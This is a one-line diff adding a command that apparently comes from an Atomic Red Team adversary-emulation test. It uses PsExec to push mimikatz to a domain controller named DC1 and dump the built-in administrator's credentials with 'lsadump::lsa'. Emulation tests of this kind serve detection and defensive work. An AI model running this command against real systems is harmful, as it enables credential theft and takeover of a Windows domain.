@@ -1,0 +1,1 @@
+"PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" /accepteula \\DC1 -c %tmp%\mimikatz\x64\mimikatz.exe "lsadump::lsa /inject /id:500" "exit"
